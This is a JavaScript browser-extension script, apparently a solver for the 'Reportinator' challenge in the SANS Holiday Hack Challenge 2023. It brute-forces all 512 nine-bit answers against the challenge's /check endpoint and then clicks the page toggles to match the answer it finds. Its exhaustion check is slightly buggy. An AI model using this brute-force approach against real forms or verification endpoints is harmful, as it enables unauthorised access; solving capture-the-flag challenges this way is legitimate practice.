function bits_from_number(number, len) {
    num_string = number.toString(2)
    while (num_string.length < len) {
        num_string = '0' + num_string
    }
    return num_string
}

async function reportinator_bruteforce() {
    let bitstring = ""
    for (var i = 0; i <= 0b111111111; i++) {
        bitstring = bits_from_number(i, 9)
        body = `input-1=${bitstring[0]}&input-2=${bitstring[1]}&input-3=${bitstring[2]}&input-4=${bitstring[3]}&input-5=${bitstring[4]}&input-6=${bitstring[5]}&input-7=${bitstring[6]}&input-8=${bitstring[7]}&input-9=${bitstring[8]}`
        response = await fetch("https://hhc23-reportinator-dot-holidayhack2023.ue.r.appspot.com/check", {
            "credentials": "include",
            "headers": {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Alt-Used": "hhc23-reportinator-dot-holidayhack2023.ue.r.appspot.com",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Sec-GPC": "1",
                "Pragma": "no-cache",
                "Cache-Control": "no-cache"
            },
            "body": body,
            "method": "POST",
            "mode": "cors"
        });

        json = await response.json()
        if (json.error != "FAILURE") {
            console.log("Bruteforce successful with bitstring:" + bitstring)
            console.log(bitstring)
            break
        }
    }
    if (bitstring == "11111111") {
        console.log("possibilities exhausted,,,")
        return
    }
    // Set the values in the page to the correct ones
    buttons = document.querySelectorAll('.toggle-image')

    for (var i = 0; i < buttons.length; i++) {
          var dataId = buttons[i].getAttribute('data-id');
          var input = document.getElementById('input-' + dataId);
          if (input.value != bitstring[i]) {
            console.log(input.value, bitstring[i])
            buttons[i].click()
          }
    }
    alert("Form filled!")
}

browser.runtime.onMessage.addListener(notify);
function notify(message) {
    if (message.type == "reportinator_bruteforce_start") {
        reportinator_bruteforce()
    }
}

console.log("Reportinator bruteforce ready for action (:")